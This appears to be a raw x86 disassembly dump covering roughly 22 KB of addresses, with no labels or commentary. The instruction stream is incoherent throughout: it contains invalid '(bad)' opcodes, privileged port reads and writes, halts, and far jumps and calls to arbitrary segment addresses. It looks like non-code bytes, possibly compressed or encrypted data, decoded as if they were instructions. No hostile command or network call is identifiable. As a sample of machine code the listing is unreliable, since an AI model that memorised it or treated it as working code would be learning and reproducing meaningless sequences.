  418a97:	clc    
  418a98:	or     bl,ah
  418a9a:	sbb    eax,0x4cccf37c
  418a9f:	or     esi,eax
  418aa1:	adc    al,0x6
  418aa3:	loopne 0x418ac1
  418aa5:	retf   
  418aa6:	jmp    0x3a854abd
  418aab:	jb     0x418a71
  418aad:	and    eax,0xafe52b27
  418ab2:	mov    ch,0x6d
  418ab4:	les    eax,FWORD PTR [esi+0x4288aa24]
  418aba:	sbb    ebx,DWORD PTR [ecx-0x3e8f8616]
  418ac0:	mov    edi,0xcbd5a35
  418ac5:	mov    BYTE PTR [edi+0x45b1a3b2],al
  418acb:	mov    DWORD PTR [eax+0x16],ebp
  418ace:	sub    edi,esp
  418ad0:	add    BYTE PTR [ebx+0x567512b5],dh
  418ad6:	dec    ebx
  418ad7:	fdivrp st(3),st
  418ad9:	hlt    
  418ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418adb:	xlat   BYTE PTR ds:[ebx]
  418adc:	fsub   st,st(3)
  418ade:	fist   DWORD PTR [ecx+0x2181008b]
  418ae4:	fimul  WORD PTR [ebp+edx*4+0x57]
  418ae8:	push   0x7ae709a4
  418aed:	pop    esp
  418aee:	aad    0x6a
  418af0:	mov    edi,0x55961b3f
  418af5:	adc    DWORD PTR [ebx],ecx
  418af7:	stos   DWORD PTR es:[edi],eax
  418af8:	outs   dx,DWORD PTR ds:[esi]
  418af9:	dec    ecx
  418afa:	(bad)  
  418afb:	aas    
  418afc:	adc    eax,0x4f07d9b7
  418b01:	mov    bh,0x45
  418b03:	adc    esi,DWORD PTR [ecx-0x1181bcea]
  418b09:	adc    esi,DWORD PTR [ecx]
  418b0b:	add    DWORD PTR [edx+ecx*4],edi
  418b0e:	add    al,0xb5
  418b10:	pushf  
  418b11:	jp     0x418b7a
  418b13:	mov    ah,0x23
  418b15:	xor    eax,DWORD PTR [edi-0x15a6c038]
  418b1b:	sub    eax,0xd8f7814b
  418b20:	mov    DWORD PTR [edx],ecx
  418b22:	pushf  
  418b23:	xor    eax,0xba699573
  418b28:	shrd   eax,edi,0x2
  418b2c:	jmp    0x4190b6
  418b31:	xor    DWORD PTR [ecx],0xffffffd8
  418b34:	mov    eax,ds:0x19421898
  418b39:	and    ebp,DWORD PTR [ebx+0x4b6f72b4]
  418b3f:	ret    0x97b2
  418b42:	pop    ebx
  418b43:	or     al,0x16
  418b45:	cmp    eax,0x78161604
  418b4a:	jmp    0x1c076868
  418b4f:	xchg   ebx,eax
  418b50:	or     al,0x25
  418b52:	push   ss
  418b53:	push   esp
  418b54:	xchg   edx,eax
  418b55:	push   ecx
  418b56:	add    dl,BYTE PTR [edi+0x62]
  418b59:	retf   0x13d2
  418b5c:	push   ss
  418b5d:	push   eax
  418b5e:	call   0x12436a3a
  418b63:	test   al,bh
  418b65:	mov    ch,BYTE PTR [edx+edx*8]
  418b68:	sar    BYTE PTR [edx+0xd46f897],cl
  418b6e:	fist   WORD PTR [ebx-0x10]
  418b71:	pmuludq mm7,QWORD PTR [ebp-0x534a1e2c]
  418b78:	mov    bh,0xf7
  418b7a:	push   edi
  418b7b:	pop    edi
  418b7c:	in     eax,0x2f
  418b7e:	mov    esp,DWORD PTR [ebp-0x56afc76]
  418b84:	jmp    0x8b7e:0x66eda3bd
  418b8b:	popf   
  418b8c:	outs   dx,BYTE PTR ds:[esi]
  418b8d:	fist   DWORD PTR [ebx+0x1ccbf5d0]
  418b93:	sub    ah,BYTE PTR [edx+0x0]
  418b96:	test   BYTE PTR [edx-0x5b],al
  418b99:	push   esp
  418b9a:	fdivr  QWORD PTR [ebp-0x40]
  418b9d:	aaa    
  418b9e:	clc    
  418b9f:	les    ebx,FWORD PTR [ebp+0x1f]
  418ba2:	mov    DWORD PTR [ebx],ebx
  418ba4:	cli    
  418ba5:	mov    ds:0xe877847d,al
  418baa:	imul   ebp,DWORD PTR [edx],0x6b
  418bad:	xor    al,0xda
  418baf:	lahf   
  418bb0:	out    dx,eax
  418bb1:	adc    BYTE PTR [esi+0x25f91a78],0x62
  418bb8:	inc    ebx
  418bb9:	or     eax,0x7f0134a3
  418bbe:	pop    esi
  418bbf:	push   esi
  418bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bc1:	cmc    
  418bc2:	ss in  al,dx
  418bc4:	or     eax,0x61003073
  418bc9:	pcmpeqw mm6,mm4
  418bcc:	ret    0x6c9d
  418bcf:	jp     0x418b5b
  418bd1:	or     eax,0x27a69d31
  418bd6:	mov    bh,0xc8
  418bd8:	inc    ebp
  418bd9:	sbb    al,0x1c
  418bdb:	mov    ebp,0xd11734ca
  418be0:	jnp    0x418b62
  418be2:	push   edx
  418be3:	push   es
  418be4:	sbb    al,0x18
  418be6:	cmp    BYTE PTR [ecx],dl
  418be8:	pop    ds
  418be9:	add    al,0xc5
  418beb:	and    BYTE PTR [ebp+0x3edd6bce],cl
  418bf1:	loopne 0x418bf3
  418bf3:	test   al,0xf4
  418bf5:	sub    edx,esi
  418bf7:	dec    ebx
  418bf8:	out    dx,al
  418bf9:	stos   DWORD PTR es:[edi],eax
  418bfa:	mov    dl,0x3f
  418bfc:	mov    dl,0x79
  418bfe:	adc    DWORD PTR [ebx-0x3f],edx
  418c01:	sbb    al,BYTE PTR ds:0xe83923ec
  418c07:	jp     0x418be9
  418c09:	inc    esp
  418c0a:	push   edx
  418c0b:	loopne 0x418bce
  418c0d:	xchg   DWORD PTR [edi],ebp
  418c0f:	ss (bad) 
  418c11:	xor    eax,0x18e3617
  418c16:	add    edi,DWORD PTR [ecx+0x62]
  418c19:	or     ebp,DWORD PTR [ebx]
  418c1b:	pop    eax
  418c1c:	push   eax
  418c1d:	lahf   
  418c1e:	add    al,0xf0
  418c20:	push   cs
  418c21:	mov    esi,0xeceb1b58
  418c26:	jmp    0x36f3:0x2f228757
  418c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c2e:	xor    DWORD PTR [esi-0x14],esp
  418c31:	sbb    DWORD PTR [edi+0x66],0x37
  418c35:	sbb    edi,DWORD PTR [esi]
  418c37:	icebp  
  418c38:	out    0x4f,al
  418c3a:	ficom  WORD PTR [esi+0x7b7c9c5d]
  418c40:	cs cmp al,0xeb
  418c43:	or     al,0x27
  418c45:	ret    
  418c46:	dec    edx
  418c47:	out    dx,eax
  418c48:	jbe    0x418bcf
  418c4a:	sbb    ch,dl
  418c4c:	test   eax,0x5784f722
  418c51:	lods   eax,DWORD PTR ds:[esi]
  418c52:	cmp    bl,BYTE PTR [esi+ebx*1]
  418c55:	nop
  418c56:	mov    ebx,0xa8b82218
  418c5b:	xor    dl,dh
  418c5d:	gs mov al,0x4b
  418c60:	ins    BYTE PTR es:[edi],dx
  418c61:	into   
  418c62:	les    edx,FWORD PTR [esi+0x15]
  418c65:	outs   dx,BYTE PTR ds:[esi]
  418c66:	ficom  DWORD PTR [esi+eax*8]
  418c69:	pop    ds
  418c6a:	lea    ecx,[esi-0x4f]
  418c6d:	pop    esp
  418c6e:	add    eax,0x73124c86
  418c73:	fld    QWORD PTR [eax+0x4]
  418c76:	cmp    al,0xad
  418c78:	(bad)  
  418c79:	cmp    ah,BYTE PTR [esi+0x33e3d2f5]
  418c7f:	and    BYTE PTR [ebx-0x57ae8645],dh
  418c85:	xlat   BYTE PTR ds:[ebx]
  418c86:	jbe    0x418cf0
  418c88:	clc    
  418c89:	mov    dh,0xf
  418c8b:	retf   
  418c8c:	adc    BYTE PTR [edi],bl
  418c8e:	push   ds
  418c8f:	cli    
  418c90:	iret   
  418c91:	jns    0x418c17
  418c93:	ss int 0xdc
  418c96:	jnp    0x418c7e
  418c98:	jne    0x418ca9
  418c9a:	mov    dl,0x73
  418c9c:	outs   dx,BYTE PTR ds:[esi]
  418c9d:	mov    esp,0x19a34545
  418ca2:	cmp    ah,ch
  418ca4:	mov    ds:0xd6a27f9e,eax
  418ca9:	inc    esi
  418caa:	dec    esi
  418cab:	popf   
  418cac:	adc    ah,BYTE PTR [ebp+esi*1-0x578678cb]
  418cb3:	out    0x2d,eax
  418cb5:	pop    eax
  418cb6:	cmp    eax,0x1f07856e
  418cbb:	cmp    BYTE PTR [eax-0x62],dh
  418cbe:	mov    ebx,0x9d21e7aa
  418cc3:	mov    ah,0xc2
  418cc5:	fwait
  418cc6:	xchg   ecx,eax
  418cc7:	pop    eax
  418cc8:	(bad)  
  418cc9:	dec    edi
  418cca:	ins    BYTE PTR es:[edi],dx
  418ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ccc:	(bad)  
  418ccd:	lock sub al,0x48
  418cd0:	cmp    BYTE PTR [ebp-0x25d44be7],dl
  418cd6:	les    ebp,FWORD PTR [ebx-0x7a]
  418cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cda:	inc    edx
  418cdb:	jno    0x418d28
  418cdd:	ins    BYTE PTR es:[edi],dx
  418cde:	imul   ebp,DWORD PTR ds:[eax],0xffffffb7
  418ce2:	das    
  418ce3:	packsswb mm4,QWORD PTR [ebx+0x3081d545]
  418cea:	xor    ebp,DWORD PTR [esi+0x57]
  418ced:	(bad)  
  418cee:	push   ecx
  418cef:	outs   dx,DWORD PTR ds:[esi]
  418cf0:	and    ebp,DWORD PTR [ecx+esi*4]
  418cf3:	adc    al,0x63
  418cf5:	pop    edi
  418cf6:	jne    0x418d31
  418cf8:	sub    ebp,DWORD PTR [edi]
  418cfa:	out    0x26,al
  418cfc:	sub    eax,0xcc8f356a
  418d01:	clc    
  418d02:	call   0x6754:0x7829ac65
  418d09:	imul   dx,si,0xff82
  418d0d:	ret    
  418d0e:	and    al,0x17
  418d10:	xor    ebx,0xbf88f115
  418d16:	pop    esi
  418d17:	int    0xe
  418d19:	scas   al,BYTE PTR es:[edi]
  418d1a:	aaa    
  418d1b:	jp     0x418d68
  418d1d:	ja     0x418cfc
  418d1f:	cmp    BYTE PTR [ebp+0xb],bl
  418d22:	and    al,0x7
  418d24:	stos   BYTE PTR es:[edi],al
  418d25:	adc    al,0x32
  418d27:	lods   al,BYTE PTR ds:[esi]
  418d28:	mov    edi,0x8732eb24
  418d2d:	xor    dl,dl
  418d2f:	test   al,0xf0
  418d31:	in     eax,dx
  418d32:	sub    ebx,0xec80f613
  418d38:	lods   eax,DWORD PTR ds:[esi]
  418d39:	xchg   BYTE PTR [esi],bh
  418d3b:	enter  0x78d9,0x5d
  418d3f:	mov    ecx,0x3d9cf674
  418d44:	pop    es
  418d45:	and    eax,0xe6e04a48
  418d4a:	clc    
  418d4b:	inc    eax
  418d4c:	jae    0x418d12
  418d4e:	sar    DWORD PTR [ecx],1
  418d50:	mov    ebp,0x6b59182c
  418d55:	inc    esi
  418d56:	push   esi
  418d57:	mov    ebx,DWORD PTR [edi+0x22825088]
  418d5d:	ins    DWORD PTR es:[edi],dx
  418d5e:	ins    DWORD PTR es:[edi],dx
  418d5f:	dec    esi
  418d60:	xor    eax,0xdecddbac
  418d65:	sbb    BYTE PTR [esp+ebx*4-0x7d],al
  418d69:	jne    0x418dd8
  418d6b:	xor    DWORD PTR [esi+0x1cb3b8c2],ecx
  418d71:	les    eax,FWORD PTR [edi+edi*4-0x6a]
  418d75:	ds pop ebx
  418d77:	push   cs
  418d78:	shl    ah,cl
  418d7a:	pop    esi
  418d7b:	jle    0x418de7
  418d7d:	push   ecx
  418d7e:	or     al,0x9c
  418d80:	out    dx,eax
  418d81:	jae    0x418dd8
  418d83:	rol    BYTE PTR [edx+ecx*2+0x2f],cl
  418d87:	nop
  418d88:	jecxz  0x418da5
  418d8a:	out    dx,eax
  418d8b:	xor    eax,0x72bd0447
  418d90:	and    ch,BYTE PTR [edx]
  418d92:	sub    ch,ch
  418d94:	xlat   BYTE PTR ds:[ebx]
  418d95:	add    bh,cl
  418d97:	arpl   WORD PTR [ecx-0x3beccdf3],bx
  418d9d:	icebp  
  418d9e:	sub    eax,0x30a32b4e
  418da3:	adc    bl,BYTE PTR [ebp+0x19eb8b15]
  418da9:	jae    0x418d5f
  418dab:	test   eax,0x77766c16
  418db0:	sub    esi,DWORD PTR [ecx-0x5e584c4f]
  418db6:	xor    BYTE PTR [ebx-0x58aea623],dl
  418dbc:	sub    eax,DWORD PTR [ebx-0x45e41cf0]
  418dc2:	xchg   ebp,edx
  418dc4:	inc    ebx
  418dc5:	rol    BYTE PTR [edi+ebx*1-0x30],cl
  418dc9:	adc    eax,0x1f5ad605
  418dce:	sar    BYTE PTR [edx+0x49],cl
  418dd1:	shl    DWORD PTR ds:0xd00f8a11,0x14
  418dd8:	bound  edi,QWORD PTR [esi-0x4bb7ebe4]
  418dde:	mov    WORD PTR [edi+ebx*4],?
  418de1:	mov    eax,ds:0x6e83a8bc
  418de6:	fisubr DWORD PTR [edx-0x2d]
  418de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dea:	and    al,0x20
  418dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ded:	pop    esp
  418dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418def:	add    edi,DWORD PTR [esi]
  418df1:	nop
  418df2:	sahf   
  418df3:	push   edi
  418df4:	into   
  418df5:	pusha  
  418df6:	mov    ch,0x25
  418df8:	shl    DWORD PTR [ebx-0x2f78ca7a],0x22
  418dff:	inc    ebp
  418e00:	push   es
  418e01:	xchg   edx,eax
  418e02:	pop    edx
  418e03:	lock repz les ebp,FWORD PTR [eax+esi*2-0x39]
  418e09:	mov    eax,ds:0x5d8bfaf4
  418e0e:	sbb    al,0xb4
  418e10:	out    0x64,al
  418e12:	inc    esp
  418e13:	mov    ch,0xa4
  418e15:	jns    0x418df5
  418e17:	lods   al,BYTE PTR ds:[esi]
  418e18:	push   ebp
  418e19:	jmp    0xd1d7:0x80ffc28c
  418e20:	mov    esp,0xc939b8ee
  418e25:	out    dx,eax
  418e26:	shl    DWORD PTR [esi-0x766353f1],0x79
  418e2d:	mul    BYTE PTR [ebp+0x1b7fd284]
  418e33:	pop    eax
  418e34:	(bad)  
  418e35:	fcom   QWORD PTR [ebx]
  418e37:	sub    esp,ecx
  418e39:	cwde   
  418e3a:	pop    ecx
  418e3b:	pushf  
  418e3c:	adc    DWORD PTR [eax+0x22],ebp
  418e3f:	arpl   WORD PTR [edx],di
  418e41:	mov    WORD PTR [edi-0x3a0dbb09],cs
  418e47:	icebp  
  418e48:	stos   BYTE PTR es:[edi],al
  418e49:	loopne 0x418e5d
  418e4b:	cld    
  418e4c:	xchg   esp,eax
  418e4d:	sbb    BYTE PTR [esi+ebx*8-0x5a1d6acf],cl
  418e54:	int    0xdd
  418e56:	scas   al,BYTE PTR es:[edi]
  418e57:	popf   
  418e58:	cld    
  418e59:	sub    BYTE PTR [ebx-0x2f],ch
  418e5c:	imul   ebx,DWORD PTR [esi-0x26],0xffffffcf
  418e60:	neg    BYTE PTR [esp]
  418e63:	leave  
  418e64:	inc    edx
  418e65:	addr16 ds in al,0x65
  418e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e6a:	add    DWORD PTR [edx],eax
  418e6c:	sub    dl,cl
  418e6e:	adc    ecx,DWORD PTR [eax+esi*1+0x37a46a14]
  418e75:	xchg   BYTE PTR [eax],bh
  418e77:	xor    edi,DWORD PTR [esi]
  418e79:	fbld   TBYTE PTR [eax+0x3]
  418e7c:	mov    bh,0xc6
  418e7e:	dec    eax
  418e7f:	xchg   esp,edi
  418e81:	(bad)  
  418e82:	gs sbb al,0xbe
  418e85:	fst    st(4)
  418e87:	adc    eax,0xc05b32ef
  418e8c:	adc    eax,0x7e058b77
  418e91:	sub    eax,0x38cb7153
  418e96:	pop    ebx
  418e97:	or     eax,0x7deeeecf
  418e9c:	call   0x495e8f0f
  418ea1:	sbb    DWORD PTR [ebx+0x297a8bbc],ebp
  418ea7:	pop    ds
  418ea8:	in     al,0xb1
  418eaa:	enter  0xec81,0x4e
  418eae:	pop    ebx
  418eaf:	mov    al,ds:0xe6e30fae
  418eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418eb5:	xlat   BYTE PTR ds:[ebx]
  418eb6:	test   DWORD PTR [ebp-0x1a701b68],eax
  418ebc:	icebp  
  418ebd:	dec    eax
  418ebe:	imul   edi,esp,0x3
  418ec1:	popf   
  418ec2:	xor    ch,BYTE PTR [edi-0x7e]
  418ec5:	cmp    BYTE PTR [ebp-0xd550dee],dh
  418ecb:	xor    BYTE PTR [ebp+0x137775c5],bh
  418ed1:	pop    ecx
  418ed2:	xor    eax,0x2375d48c
  418ed7:	mov    ch,0x78
  418ed9:	xchg   ebx,eax
  418eda:	cmc    
  418edb:	jnp    0x418f39
  418edd:	sub    dh,0x7c
  418ee0:	dec    edi
  418ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ee2:	pushf  
  418ee3:	cmp    BYTE PTR [edi-0x2],0xde
  418ee7:	into   
  418ee8:	xlat   BYTE PTR ds:[ebx]
  418ee9:	or     esi,esp
  418eeb:	daa    
  418eec:	rol    DWORD PTR [ecx+eax*4],0x1d
  418ef0:	or     BYTE PTR [edx+0x4247a59],0xa8
  418ef7:	xchg   edx,eax
  418ef8:	test   ecx,eax
  418efa:	ds mov ecx,0x39015a69
  418f00:	sub    BYTE PTR [eax],bh
  418f02:	bound  esi,QWORD PTR [ebp-0x20]
  418f05:	clc    
  418f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f07:	test   eax,0x73f52d3f
  418f0c:	jmp    0x418f44
  418f0e:	rcr    DWORD PTR [ebx+0xf],1
  418f11:	loop   0x418f10
  418f13:	in     al,dx
  418f14:	mov    al,ds:0xdbdf07ff
  418f19:	adc    edi,DWORD PTR [ebp+0x30]
  418f1c:	dec    edx
  418f1d:	xchg   BYTE PTR [eax],ch
  418f1f:	cld    
  418f20:	scas   eax,DWORD PTR es:[edi]
  418f21:	push   0xf0b57b22
  418f26:	fwait
  418f27:	scas   al,BYTE PTR es:[edi]
  418f28:	inc    edi
  418f29:	pop    es
  418f2a:	inc    ebx
  418f2b:	mov    bh,0xfd
  418f2d:	mov    edi,DWORD PTR [ecx-0x4ee1d417]
  418f33:	(bad)  
  418f34:	jle    0x418f93
  418f36:	icebp  
  418f37:	ins    DWORD PTR es:[edi],dx
  418f38:	inc    edi
  418f39:	jecxz  0x418f0c
  418f3b:	cmp    eax,0x43d0e816
  418f40:	mov    ds:0xb1099577,eax
  418f45:	push   eax
  418f46:	fcmovb st,st(1)
  418f48:	pop    es
  418f49:	not    DWORD PTR [edi-0x76]
  418f4c:	lahf   
  418f4d:	mov    edi,0x95b9e634
  418f52:	lds    eax,FWORD PTR [edx]
  418f54:	mov    WORD PTR [esi],cs
  418f56:	sti    
  418f57:	test   eax,0xb9b859a4
  418f5c:	jp     0x418fa8
  418f5e:	push   ss
  418f5f:	pop    ecx
  418f60:	ds jne 0x418f7c
  418f63:	bound  ebp,QWORD PTR [ebp-0x1bc2a4bd]
  418f69:	jnp    0x418f19
  418f6b:	jns    0x418f38
  418f6d:	out    0x99,eax
  418f6f:	(bad)  
  418f70:	(bad)  [esi+eax*4+0x5afd6520]
  418f77:	in     eax,dx
  418f78:	jb     0x418fad
  418f7a:	sub    ah,BYTE PTR [ebx+0x33]
  418f7d:	outs   dx,DWORD PTR ds:[esi]
  418f7e:	loopne 0x418fe9
  418f80:	add    al,0x70
  418f82:	and    eax,0xd9a833d9
  418f87:	in     al,0x2a
  418f89:	out    0x53,al
  418f8b:	mov    eax,ds:0x1c6e46fa
  418f90:	mov    edi,0xd5463879
  418f95:	mov    bh,0x43
  418f97:	pop    ds
  418f98:	mov    ds:0xf20f9e45,eax
  418f9d:	sti    
  418f9e:	push   0xffffffcc
  418fa0:	enter  0xece3,0xb6
  418fa4:	adc    ch,al
  418fa6:	bnd jp 0x418fba
  418fa9:	mov    dl,0xeb
  418fab:	xor    edx,esp
  418fad:	test   BYTE PTR [ecx-0x6e],bh
  418fb0:	add    BYTE PTR [ebx],ah
  418fb2:	sbb    al,0x45
  418fb4:	pop    es
  418fb5:	(bad)  
  418fb6:	jmp    0x419016
  418fb8:	jecxz  0x418f5f
  418fba:	jae    0x418f61
  418fbc:	aam    0xfc
  418fbe:	mov    ebp,0x8bf43d5b
  418fc3:	stos   BYTE PTR es:[edi],al
  418fc4:	int    0x99
  418fc6:	add    BYTE PTR [ecx+0x8],bh
  418fc9:	or     eax,DWORD PTR [ecx-0x61]
  418fcc:	sbb    bl,BYTE PTR [ebx+0x1274d05e]
  418fd2:	les    di,DWORD PTR [esi+eiz*2+0x64]
  418fd7:	jl     0x419035
  418fd9:	fadd   DWORD PTR [ebx-0x2831a05]
  418fdf:	retf   0x6dc1
  418fe2:	mov    ds:0xee76154c,al
  418fe7:	pop    ebp
  418fe8:	ins    DWORD PTR es:[edi],dx
  418fe9:	xor    eax,0xcfe6ba76
  418fee:	sub    BYTE PTR [eax-0x73],cl
  418ff1:	jno    0x418ffa
  418ff3:	(bad)  
  418ff5:	mov    eax,0x78137c7
  418ffa:	or     dh,0x7d
  418ffd:	cmp    ebp,edi
  418fff:	mov    cl,BYTE PTR [ebx+0x11]
  419002:	add    eax,0x2d1a8f9
  419007:	mov    ah,0x97
  419009:	adc    esp,DWORD PTR [ecx+0x1e]
  41900c:	xchg   edx,eax
  41900d:	test   DWORD PTR [edi+0x75af3daf],0x132922be
  419017:	inc    edi
  419018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419019:	int3   
  41901a:	into   
  41901b:	loopne 0x41902f
  41901d:	ja     0x419065
  41901f:	push   ss
  419020:	hlt    
  419021:	adc    eax,0x1c9c6120
  419026:	test   al,0xa4
  419028:	das    
  419029:	jbe    0x41902f
  41902b:	out    dx,al
  41902c:	test   al,0xc2
  41902e:	mov    dl,0xe2
  419030:	mov    eax,ds:0x6f3e6bd0
  419035:	xchg   edx,eax
  419036:	jmp    0x418fe1
  419038:	(bad)  
  419039:	dec    BYTE PTR [ecx+edx*8+0x4a]
  41903d:	mov    al,es:0x80a980e
  419043:	in     eax,dx
  419044:	lahf   
  419045:	shl    DWORD PTR [ecx],1
  419047:	ss push esp
  419049:	push   es
  41904a:	retf   
  41904b:	(bad)  
  41904c:	popa   
  41904d:	cld    
  41904e:	jg     0x41900b
  419050:	shl    BYTE PTR [ecx+0x19f1ef93],cl
  419056:	push   ebp
  419057:	jge    0x418fe5
  419059:	xlat   BYTE PTR ds:[bx]
  41905b:	push   ebp
  41905c:	es inc eax
  41905e:	lahf   
  41905f:	(bad)  
  419060:	rcl    edx,1
  419062:	repz mov esp,0x1a9ff77c
  419068:	push   esp
  419069:	ja     0x418ff8
  41906b:	outs   dx,BYTE PTR ds:[esi]
  41906c:	jp     0x419013
  41906e:	mov    ah,0xc5
  419070:	jno    0x419088
  419072:	call   0xc4e9a61b
  419077:	jmp    0x4190cf
  419079:	fisub  DWORD PTR [ecx]
  41907b:	mov    ebx,0x18d11393
  419080:	out    dx,eax
  419081:	adc    edx,ebp
  419083:	adc    al,0x77
  419085:	out    dx,eax
  419086:	jmp    0xef57:0xe4e56eec
  41908d:	sub    esp,eax
  41908f:	or     eax,0x67ccca9e
  419094:	xor    DWORD PTR [ebx+0x1ac8558a],0x46
  41909b:	lods   eax,DWORD PTR ds:[esi]
  41909c:	imul   DWORD PTR ds:0x8984edd
  4190a2:	lods   eax,DWORD PTR ds:[esi]
  4190a3:	add    eax,0x6a2de1a6
  4190a8:	ret    
  4190a9:	pop    ecx
  4190aa:	pop    ss
  4190ab:	loope  0x4190c2
  4190ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190ae:	outs   dx,BYTE PTR ds:[esi]
  4190af:	ins    DWORD PTR es:[edi],dx
  4190b0:	idiv   DWORD PTR [ebp-0x552a6d48]
  4190b6:	xor    ecx,ecx
  4190b8:	shr    edi,0x2
  4190bb:	or     edi,DWORD PTR [ebp+0x14]
  4190be:	or     eax,ecx
  4190c0:	cmp    edx,eax
  4190c2:	jne    0x41965b
  4190c8:	cmp    DWORD PTR [ebp+0xc],edi
  4190cb:	jmp    0x419655
  4190d0:	arpl   WORD PTR [edi+0x1f],di
  4190d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d4:	adc    esp,DWORD PTR [esi+0x24f3262]
  4190da:	xchg   esi,eax
  4190db:	outs   dx,BYTE PTR ds:[esi]
  4190dc:	lea    eax,[ebp-0x2a]
  4190df:	outs   dx,BYTE PTR ds:[esi]
  4190e0:	mov    esp,0x3d160c59
  4190e5:	add    al,0x16
  4190e7:	push   ss
  4190e8:	fiadd  DWORD PTR [eax]
  4190ea:	dec    ecx
  4190eb:	sub    al,0xa1
  4190ed:	jl     0x4190cc
  4190ef:	shl    ecx,1
  4190f1:	push   esi
  4190f2:	hlt    
  4190f3:	sbb    bh,bl
  4190f5:	aaa    
  4190f6:	shl    BYTE PTR [edx],cl
  4190f8:	xor    edi,DWORD PTR [esp+eiz*8-0x6]
  4190fc:	mov    esi,0x9e9418d
  419101:	out    dx,al
  419102:	sub    ecx,ebx
  419104:	push   es
  419105:	fmul   DWORD PTR [edx]
  419107:	mov    eax,ds:0x3e7b18a6
  41910c:	inc    ebp
  41910d:	dec    edx
  41910e:	cmp    eax,0xec16473b
  419113:	sti    
  419114:	je     0x4190be
  419116:	je     0x4190ac
  419118:	and    al,dl
  41911a:	cld    
  41911b:	add    ebp,0xffffff9f
  41911e:	mov    ecx,0xc5017cd4
  419123:	xor    edi,DWORD PTR [edi]
  419125:	int    0xce
  419127:	xchg   ebx,eax
  419128:	jno    0x4190ce
  41912a:	sahf   
  41912b:	fiadd  WORD PTR [edx-0x4d3ad6ec]
  419131:	xchg   DWORD PTR [edx],ebp
  419133:	jnp    0x419107
  419135:	(bad)  
  419136:	xchg   esi,eax
  419137:	jb     0x419139
  419139:	jbe    0x419172
  41913b:	aam    0x6e
  41913d:	outs   dx,DWORD PTR ds:[esi]
  41913e:	push   cs
  41913f:	jp     0x419177
  419141:	or     eax,0x847c3529
  419146:	push   ecx
  419147:	or     al,0x29
  419149:	and    BYTE PTR gs:[esi+edi*1+0x4a],al
  41914e:	test   BYTE PTR ds:0x85064738,dh
  419154:	push   0x880e674d
  419159:	bnd jmp 0xa64ddbe9
  41915f:	mov    esp,0x4fa3e522
  419164:	cdq    
  419165:	lahf   
  419166:	scas   eax,DWORD PTR es:[edi]
  419167:	(bad)  
  419169:	jg     0x4191d3
  41916b:	retf   0xcb7b
  41916e:	xor    BYTE PTR [ebp-0x3e],0x95
  419172:	add    BYTE PTR [ecx-0x11a8ff46],ah
  419178:	xchg   ebx,eax
  419179:	arpl   WORD PTR ds:0x12162ec,dx
  41917f:	pop    esp
  419180:	sub    DWORD PTR [edi-0x3b],0x462b995d
  419187:	daa    
  419188:	pusha  
  419189:	hlt    
  41918a:	adc    cl,BYTE PTR [ebp-0x6]
  41918d:	pop    ds
  41918e:	add    ebp,ebx
  419190:	outs   dx,DWORD PTR ds:[esi]
  419191:	daa    
  419192:	mov    eax,0x5e0dc0e2
  419197:	vmread DWORD PTR [edx+0x29],edx
  41919b:	std    
  41919c:	daa    
  41919d:	fbstp  TBYTE PTR [ebp-0x4468e86b]
  4191a3:	or     al,0xe7
  4191a5:	mov    ebp,0x6268f578
  4191aa:	lock test BYTE PTR [edi-0x5a],bl
  4191ae:	mov    al,0x1b
  4191b0:	jo     0x4191e5
  4191b2:	mov    ebp,DWORD PTR [ebx]
  4191b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191b5:	mov    ds:0x5b2abdb7,eax
  4191ba:	pop    edi
  4191bb:	fsub   DWORD PTR ds:[edi+0x75b3f50a]
  4191c2:	icebp  
  4191c3:	and    al,0xe
  4191c5:	mov    DWORD PTR ds:0xeafec12c,ecx
  4191cb:	jmp    0xebe9:0x89fd3988
  4191d2:	jl     0x4191e8
  4191d4:	mov    bl,0x16
  4191d6:	sti    
  4191d7:	stos   DWORD PTR es:[edi],eax
  4191d8:	sbb    ah,0x2a
  4191db:	inc    ecx
  4191dc:	mov    esp,0xe90b1ad2
  4191e1:	push   edx
  4191e2:	fcomp  QWORD PTR [ebx+0x15]
  4191e5:	fst    QWORD PTR [edi]
  4191e7:	inc    ebx
  4191e8:	xor    DWORD PTR [ebx+0x47cc44ed],eax
  4191ee:	jp     0x4191a5
  4191f0:	cmp    dh,BYTE PTR [ecx]
  4191f2:	push   ds
  4191f3:	push   cs
  4191f4:	pop    es
  4191f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191f6:	xchg   esi,eax
  4191f7:	pop    ebx
  4191f8:	dec    esi
  4191f9:	sub    edi,esp
  4191fb:	jne    0x419270
  4191fd:	push   esp
  4191fe:	fldenv ds:[edx]
  419201:	int3   
  419202:	adc    eax,0x62325087
  419207:	and    eax,0xcd9ff3c9
  41920c:	cmc    
  41920d:	pop    esi
  41920e:	add    BYTE PTR [eax-0x54],ch
  419211:	int3   
  419212:	retf   0x8ce0
  419215:	xor    ecx,edx
  419217:	pop    eax
  419218:	or     eax,0xb9eb08f3
  41921d:	sbb    bl,BYTE PTR [edx-0x1]
  419220:	daa    
  419221:	push   ecx
  419222:	sub    eax,0x3d4de04d
  419227:	in     eax,dx
  419228:	jb     0x4191d9
  41922a:	ja     0x4191ce
  41922c:	push   es
  41922d:	hlt    
  41922e:	sbb    ch,BYTE PTR [ebx+eax*1+0xe465eb1]
  419235:	dec    esi
  419236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419237:	push   ebp
  419238:	adc    DWORD PTR [ebx+0x53],esp
  41923b:	call   0x428e:0xf6124b83
